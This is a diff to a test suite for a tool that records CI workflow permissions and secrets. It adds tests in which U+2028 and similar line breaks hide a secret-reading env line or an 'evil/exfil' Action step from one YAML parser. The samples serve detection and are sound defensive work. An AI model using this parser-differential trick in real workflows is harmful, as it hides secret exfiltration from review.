@@ -2,7 +2,7 @@
 // scripts. AI agents edit these as readily as code, and a new `permissions: write-all`, secret,
 // or postinstall hook is a bigger change than most functions, so each is recorded and reviewed.
 
-import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import path from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
@@ -11,6 +11,7 @@ import { expressionsIn, literalOf, secretsRead } from "../src/ci-expressions.js"
 import { buildLock } from "../src/lock.js";
 import { projectFiles } from "../src/project-files.js";
 import { YamlFile } from "../src/yaml-nodes.js";
+import { removeTemporary } from "./temporary.js";
 
 const PIN = "3d3c42e5aac5ba805825da76410c181273ba90b1";
 const DIGEST = `sha256:${"a".repeat(64)}`;
@@ -21,7 +22,7 @@ let dir: string;
 // A throwaway repository per test, from file names and contents.
 const repos: string[] = [];
 afterAll(() => {
-  for (const r of repos) rmSync(r, { recursive: true, force: true });
+  for (const r of repos) removeTemporary(r);
 });
 function repo(files: Record<string, string>): string {
   const root = mkdtempSync(path.join(tmpdir(), "permlang-config-"));
@@ -89,7 +90,7 @@ beforeAll(() => {
   );
 }, 30_000);
 
-afterAll(() => rmSync(dir, { recursive: true, force: true }));
+afterAll(() => removeTemporary(dir));
 
 const entry = (name: string) => projectFiles(dir).find((f) => f.name === name)!;
 
@@ -181,7 +182,7 @@ describe("project configuration: Actions in the repository, and Docker images", 
     );
     writeFileSync(path.join(repo, "package.json"), "{ not json");
   });
-  afterAll(() => rmSync(repo, { recursive: true, force: true }));
+  afterAll(() => removeTemporary(repo));
 
   it("records composite Actions under .github/actions; an image is pinned only by its digest", () => {
     const action = projectFiles(repo).find((f) => f.name === "<action.yml>")!;
@@ -1074,7 +1075,7 @@ describe("project configuration: a workflow GitHub wouldn't run as written", () 
     repo = mkdtempSync(path.join(tmpdir(), "permlang-project-invalid-"));
     mkdirSync(path.join(repo, ".github", "workflows"), { recursive: true });
   });
-  afterAll(() => rmSync(repo, { recursive: true, force: true }));
+  afterAll(() => removeTemporary(repo));
   const read = (text: string) => {
     writeFileSync(path.join(repo, ".github", "workflows", "w.yml"), text);
     return projectFiles(repo).find((f) => f.name === "<w.yml>")?.actual;
@@ -1093,5 +1094,36 @@ describe("project configuration: a workflow GitHub wouldn't run as written", () 
 
   it("doesn't for a workflow with both", () => {
     expect(read("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n")!.some((c) => c.startsWith("ci.unverifiable"))).toBe(false);
+  });
+});
+
+// The runner reads YAML with YamlDotNet, which also ends a line at U+0085, U+2028 and U+2029, as
+// YAML 1.1 does; the `yaml` library doesn't. So in `#note<U+2028>env: ...` one parser reads a key
+// and the other a comment: the secret it reads was recorded by nothing.
+describe("project configuration: line breaks YAML parsers disagree on", () => {
+  const hidden = (ch: string, secret: string) => workflow("on: push", `#note${ch}env: {LEAK: "\${{ secrets.${secret} }}"}`, ...JOB);
+
+  it.each([
+    ["U+0085", "\u0085"],
+    ["U+2028", "\u2028"],
+    ["U+2029", "\u2029"],
+  ])("records a workflow with %s as unverifiable, and still reads the rest", (_, ch) => {
+    expect(grants(hidden(ch, "NPM_TOKEN"))).toEqual(["ci.permission(default)", "ci.trigger(push)", expect.stringMatching(UNVERIFIABLE)]);
+  });
+
+  it("changes the lock when what's hidden changes", () => {
+    expect(grants(hidden("\u2028", "NPM_TOKEN"))).not.toEqual(grants(hidden("\u2028", "DEPLOY_KEY")));
+  });
+
+  it("records a local Action with one as unverifiable", () => {
+    const root = repo({
+      ".github/workflows/w.yml": ["on: push", "jobs:", "  a:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: ./tools/act"].join("\n"),
+      "tools/act/action.yml": `runs:\n  using: composite\n  steps:\n    #x\u2028    - uses: evil/exfil@main\n`,
+    });
+    expect(grants(root, "tools/act/action.yml")).toEqual([expect.stringMatching(UNVERIFIABLE)]);
+  });
+
+  it("reads U+0085 in an expression as GitHub's lexer does: as a space", () => {
+    expect(secretsRead("secrets\u0085.NPM_TOKEN")).toEqual(["NPM_TOKEN"]);
   });
 });
